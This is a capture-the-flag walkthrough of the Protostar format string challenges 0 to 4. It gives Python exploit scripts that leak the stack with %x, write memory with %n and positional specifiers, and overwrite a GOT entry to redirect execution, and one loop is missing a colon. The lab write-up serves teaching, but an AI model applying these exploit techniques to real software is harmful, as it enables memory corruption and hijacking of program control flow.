# Format

These challenges explore the extent of format string vulnerabilities.

## Challenge 0

This group of challenges follows right after the stack overflow challenges so logically this first format challenge is just a buffer overflow example. We can get the flag after putting in 64 characters and then the hex string 0xdeadbeef. However this problem says that it needs to be solved in under 10 bytes.

```python
import subprocess
exploit = "%64d\xef\xbe\xad\xde"
print len(exploit), "bytes"
subprocess.call(['/opt/protostar/bin/format0', exploit])
```

![format0_2](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format0_2_2.png)

We can get down to under 10 bytes if we use a buffering format string. Using %Xd will pad the string with X ints. We pad our exploit with 64 bytes to overflow to the variable we need to change.

## Challenge 1

In the previous challenge we were controlling the 2nd argument for printf. In this one we will be controlling the first argument.

Looking at the source code,

```c
int target;
void vuln(char *string)
{
  printf(string);
  if(target) {
    printf("you have modified the target :)\n");
  }
}
int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

, we can see that we need some way to change the target variable. This takes some knowledge of how functions are called in 32 bit systems. The arguments are pushed onto the stack and the called function pops off what it needs. As we can see above we are only passing 1 thing to printf. Therefore if we input a format string like %x it will need to read the next argument from the stack. This will leak information from the stack because that value would normally not be able to be seen.

This challenge gives the hint to use objdump -t to find the address of the target variable but it can also be seen in the disassembly.

objdump -t:

![format1_2](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format1_2.PNG)

disassembly < vuln+17 >:

![format1_1](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format1_1.PNG)

The address we are looking for is 0x08049638. Now we can start leaking values from the stack with increasing amounts of %x until we find where that address is located.

```python
import subprocess
offset = 200
exploit = "%x " * offset
subprocess.call(['/opt/protostar/bin/format1', exploit])
```

![format1_3](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format1_3_2.png)

Looking at the leaked addresses we can't find 0x08049638. However we do see some repeating numbers near the end of the dump. If we look at those numbers in ascii we see that it is our '%x ' that we input. This means that we can put our target address onto the stack ourself. Now that we have the address we need to write to it. If we use %n we can write the current number of characters written so far to the address passed to it.

```python
import subprocess
offset = 150
exploit = "\x38\x96\x04\x08" + "%x " * offset
subprocess.call(['/opt/protostar/bin/format1', exploit])
```

![format1_7_2](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format1_7_2.png)

We can see that the stack now contains our value. Now we just need to find how many %x we need for this value to be input into %n. While trying to find the correct offset I noticed that the stack was moving around depending on the length of the input string so I decided to add some A's to the end as padding.

```python
import subprocess
offset = 129
exploit = "\x38\x96\x04\x08" + "%x " * offset + "%n" + "A"*200
subprocess.call(['/opt/protostar/bin/format1', exploit[:450]])
```

![format1_8](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format1_8_2.png)

As you can see we were able to change the value of target by writing it's address to the stack and then writing to it with %n.

## Challenge 2

Continuing from the last challenge we are now going to write a specific value to the target variable.

![format2_2_2](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format2_2_2.png)

Looking at the disassembly we see that it is reading in 512 characters using fgets, printing that buffer out with printf and then checking if the target variable is 64. This means that we need to print out 64 characters and then use %n to write to that variable.

![format2_4](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format2_4.PNG)

Putting in a few test values we can see that there are the same 3 values on the stack each time before we get to our input. So now we know what we need to do. We need to write the address we are trying to change first, some number of characters, %x 3 times, then finally %n to write to the address.

```python
exploit = "\xe4\x96\x04\x08"
offset = 40
print exploit + "A"*offset + "%x%x%x%n"
```

We can output this to a file and then feed it into the program using gdb.

![format2_6](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format2_6.PNG)

Using an offset of 40 was just an educated guess and it happened to only be 1 off from what we needed. After changing it to 41 and running again we get the flag.

![format2_8](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format2_8.PNG)

## Challenge 3

Starting off by running this challenge it appears as if we are just trying to write a larger number this time with the same concepts. 

![format3_0](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format3_0.PNG)

![format3_1](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format3_1.PNG)

Taking a peek at the disassembly shows that at < vuln+59 > that is correct and we need to overwrite 0x080496f4 with the value 0x01025544. Looking at < vuln+18 > we can see that the buffer is only 512 bytes long so we need to slightly change the method of the previous challenge. We can use padding to write more and increase the value of %n without taking up many bytes in the input string.  Writing this number of bytes through padding would take quite a while so to increase the speed we can write to each byte of target individually.

Our exploit will start as writing all 4 addresses to the stack:

```python
import struct
address = 0x080496f4
exploit = ""
for i in range(4):
    exploit += struct.pack("I", 0x080496f4 + i)
print exploit
```

![format3_2](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format3_2.PNG)

Through some testing we can see that our input is the 12th value on the stack. Looking back at the value required in the disassembly we see that the final byte needs to be 0x44 or 68 so we can add that as padding and try writing it to the first address.

```python
import struct
address = 0x080496f4
exploit = ""
for i in range(4):
    exploit += struct.pack("I", 0x080496f4 + i)
exploit += "%12$52x%12$n"
# %12 will access the 12th value on the stack
# $52x will print that value with 52 bytes of padding
# 52 was chosen because 0x44 is 68 and 16 bytes have already been written so 68 - 16 = 52
# %12$n will access the 12th value on the stack and write the total number of bytes printed
print exploit
```

![format3_3](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format3_3.PNG)

Writing the output to a file and feeding that file to the challenge through gdb we can see that we have set the lowest byte to 0x44. On to the next byte.

```python
import struct
address = 0x080496f4
exploit = ""
for i in range(4):
    exploit += struct.pack("I", 0x080496f4 + i)
exploit += "%12$52x%12$n"
exploit += "%13$17x%13$n"
# %13 will access the 13th value on the stack
# 17 was chosen because 0x55 is 85 and we have already written 68 characters so 85 - 68 = 17
# %13$n will access the 13th value on the stack and write the total number of bytes printed
print exploit
```

![format3_4](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format3_4.PNG)

One more byte down. Now the next byte needs to be 0x02. How are we going to get 0x02 when we are already at 0x55 if %n writes the total number of bytes? Well we need to overflow that byte past 0xff. So we need to get to a total of 0x102 bytes written. This also happens to set the final byte to the proper value so this is the last step.

```python
import struct
address = 0x080496f4
exploit = ""
for i in range(4):
    exploit += struct.pack("I", 0x080496f4 + i)
exploit += "%12$52x%12$n"
exploit += "%13$17x%13$n"
exploit += "%14$173x%14$n"
print exploit
```

![format3_5](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format3_5.PNG)

There we see our flag to confirm we have the proper value.

## Challenge 4

This challenge expands on the previous one but this time we are changing the execution path of the program.

```c
void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}
void vuln()
{
  char buffer[512];
  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  exit(1);
}
int main(int argc, char **argv)
{
  vuln();
}
```

Looking at the source code we can see that we need to somehow execute hello(). Looking at printf the only thing that comes after it is exit(1). This means that we need to change exit somehow. We can do that by editing the global offset table to point at hello() instead of exit(). First let's find the value of the hello function.

![format4_0](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format4_0.PNG)

Next let's find the location of the global offset table. To do that we disassemble vuln to see what the value is called for exit. At < vuln+61 > we find that the value is 0x080483ec so let's disassemble that location. There we find a jump to 0x08049724 so let's examine what that is.

![format4_1](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format4_1.PNG)

As we can see from the final line we found the address of exit() in the global offset table. Then let's check how deep our string is on the stack.

![format4_2](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format4_2.PNG)

Now we just need to use the same process as the previous challenge to write the address of hello() to this table address.

```python
import struct
got_exit = 0x08049724
exploit = ""
for i in range(4)
	exploit += struct.pack("I", got_exit + i)
exploit += "%4$164x%4$n"
exploit += "%5$208x%5$n"
exploit += "%6$128x%6$n"
exploit += "AAAA%7$n"
print exploit
```

I used 4 A's for the last one instead of padding because using %x would print 8 characters minimum and we only needed 4. Outputting it to a file and then feeding it through gdb delivers us the key.

![format4_3](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format4_3.PNG)

